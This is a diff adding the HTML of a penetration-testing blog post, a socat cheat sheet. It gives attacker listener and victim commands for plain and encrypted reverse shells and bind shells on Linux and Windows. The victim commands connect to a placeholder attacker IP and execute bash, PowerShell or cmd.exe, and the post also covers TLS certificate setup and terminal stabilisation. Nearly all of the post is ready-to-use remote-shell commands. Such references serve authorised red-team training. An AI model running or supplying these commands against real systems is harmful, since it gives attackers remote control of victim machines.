@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Socat Cheatsheet - Better netcat - </title><meta name="Description" content="This is the cheat sheet for Socat, TLDR: Socat provide a more stablize shell compared to netcat. You can even encrypt your communication"><meta property="og:title" content="Socat Cheatsheet - Better netcat" />
+<meta property="og:description" content="This is the cheat sheet for Socat, TLDR: Socat provide a more stablize shell compared to netcat. You can even encrypt your communication" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/socat-red-team-tool/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-06-20T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-06-20T00:00:00+00:00" /><meta property="og:site_name" content="SecurityNguyen Site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Socat Cheatsheet - Better netcat"/>
+<meta name="twitter:description" content="This is the cheat sheet for Socat, TLDR: Socat provide a more stablize shell compared to netcat. You can even encrypt your communication"/>
+<meta name="application-name" content="SecurityNguyen">
+<meta name="apple-mobile-web-app-title" content="SecurityNguyen"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/posts/socat-red-team-tool/" /><link rel="prev" href="/posts/os-detection-and-traceroute/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Socat Cheatsheet - Better netcat",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/posts\/socat-red-team-tool\/"
+        },"genre": "posts","keywords": "Red Team","wordcount":  356 ,
+        "url": "\/posts\/socat-red-team-tool\/","datePublished": "2023-06-20T00:00:00+00:00","dateModified": "2023-06-20T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Nguyen Nguyen"
+            },"description": "This is the cheat sheet for Socat, TLDR: Socat provide a more stablize shell compared to netcat. You can even encrypt your communication"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">SecurityNguyen</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">SecurityNguyen</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Socat Cheatsheet - Better netcat</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/tryhardnguyen" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Nguyen Nguyen</a></span>&nbsp;<span class="post-category">included in <a href="/categories/penetration-testing/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Penetration Testing</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-06-20">2023-06-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;356 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;2 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#reverse-shell-for-linux">Reverse Shell for Linux</a></li>
+    <li><a href="#additional-step">Additional step:</a></li>
+    <li><a href="#reverse-shell-for-windows">Reverse Shell for Windows</a></li>
+    <li><a href="#encrypted-shell">Encrypted Shell</a>
+      <ul>
+        <li><a href="#encrypted-reverse-shell-for-linux">Encrypted Reverse Shell for Linux</a></li>
+        <li><a href="#encrypted-reverse-shell-for-windows">Encrypted Reverse Shell for Windows</a></li>
+        <li><a href="#encrypted-blind-shell-for-linux">Encrypted Blind Shell for Linux</a></li>
+        <li><a href="#encrypted-blind-shell-for-windows">Encrypted Blind Shell for Windows</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Tool used to establish a more stabilize shell compare to netcat.
+Features:</p>
+<ul>
+<li>Used of the arrow key</li>
+<li>Allows for interactive commands such as sudo</li>
+<li>Use of CTRL + S, CTRL + C</li>
+</ul>
+<h2 id="reverse-shell-for-linux">Reverse Shell for Linux</h2>
+<p>Attacker:</p>
+<ul>
+<li><code>socat TCP-L:&lt;port&gt; FILE:</code>tty<code>,raw,echo=0</code>
+Victim:
+<code>socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</code></li>
+</ul>
+<h2 id="additional-step">Additional step:</h2>
+<p>Open a new command prompt, and type stty-a, record the value of rows and columns</p>
+<p>Next, in your reverse/bind shell, type:
+<code>stty rows &lt;number&gt;</code></p>
+<p><em>note: The number represent the number you recorded.</em>
+and
+<code>stty cols &lt;number&gt;</code></p>
+<p>Filling in the numbers you got from running the command in your own terminal.</p>
+<p>This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.</p>
+<h2 id="reverse-shell-for-windows">Reverse Shell for Windows</h2>
+<p>Attacker:</p>
+<ul>
+<li><code>socat tcp-l:&lt;port&gt; -</code>
+Victim:
+If you want spawn a powershell:</li>
+<li>socat tcp:&lt;attacker_ip&gt;:&lt;attacker_port&gt; EXEC:powershell,pipes
+If you want spawn a command line:</li>
+<li>socat tcp:&lt;attacker_ip&gt;:&lt;attacker_port&gt; EXEC:cmd.exe,pipes</li>
+</ul>
+<p>Then refer to the <strong>additional step</strong>.</p>
+<h2 id="encrypted-shell">Encrypted Shell</h2>
+<ol>
+<li>Generate a Certificate:
+<code>openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</code></li>
+<li>Merge key and cert together:
+<code>cat shell.key shell.crt &gt; encrypt.pem</code></li>
+<li>Decide whether to use a reverse shell vs a blind shell.</li>
+</ol>
+<h3 id="encrypted-reverse-shell-for-linux">Encrypted Reverse Shell for Linux</h3>
+<ol>
+<li>
+<p>Set up a Listener on the Attacker
+<code>socat OPENSSL-LISTEN:&lt;port&gt;,cert=encrypt.pem,verify=0 FILE:</code>tty<code>,raw,echo=0</code></p>
+</li>
+<li>
+<p>Target machine connect back to the Attacker
+<code>socat OPENSSL:&lt;attacker_ip&gt;:&lt;attacker_port&gt;,verify=0 EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</code></p>
+</li>
+<li>
+<p>Refer to the <strong>additional step</strong></p>
+</li>
+</ol>
+<h3 id="encrypted-reverse-shell-for-windows">Encrypted Reverse Shell for Windows</h3>
+<ol>
+<li>
+<p>Set up a Listener on the Attacker Machine
+<code>socat OPENSSL-LISTEN:&lt;port&gt;,cert=encrypt.pem,verify=0 -</code></p>
+</li>
+<li>
+<p>Target machine connect back to the Attacker
+<code>socat OPENSSL:&lt;attacker_ip&gt;:&lt;attacker_port&gt;,verify=0 -</code></p>
+</li>
+<li>
+<p>Refer to the <strong>additional step</strong></p>
+</li>
+</ol>
+<h3 id="encrypted-blind-shell-for-linux">Encrypted Blind Shell for Linux</h3>
+<p><em>Note: Blind shell require you moving the .pem to the target</em></p>
+<ol>
+<li>
+<p>Set up a Listener on the Victim
+<code>socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 EXEC:/bin/bash</code></p>
+</li>
+<li>
+<p>Attacker connect to the open port on the victim machine
+<code>socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 -</code></p>
+</li>
+<li>
+<p>Refer to the <strong>additional step</strong></p>
+</li>
+</ol>
+<h3 id="encrypted-blind-shell-for-windows">Encrypted Blind Shell for Windows</h3>
+<p><em>Note: Blind shell require you moving the .pem to the target</em></p>
+<ol>
+<li>
+<p>Set up a Listener on the Victim
+<code>socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 EXEC:powershell,pipes</code></p>
+<p>If you want the command line:
+<code>socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes</code></p>
+</li>
+<li>
+<p>Attacker connect to the open port on the victim machine
+<code>socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 -</code></p>
+</li>
+<li>
+<p>Refer to the <strong>additional step</strong></p>
+</li>
+</ol>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-06-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/posts/socat-red-team-tool/" data-title="Socat Cheatsheet - Better netcat" data-hashtags="Red Team"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/posts/socat-red-team-tool/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/red-team/">Red Team</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/os-detection-and-traceroute/" class="prev" rel="prev" title="OS Detection/Traceroute"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>OS Detection/Traceroute</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.111.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/tryhardnguyen" target="_blank">Nguyen Nguyen</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/twemoji@14.0.2/dist/twemoji.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"twemoji":true};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
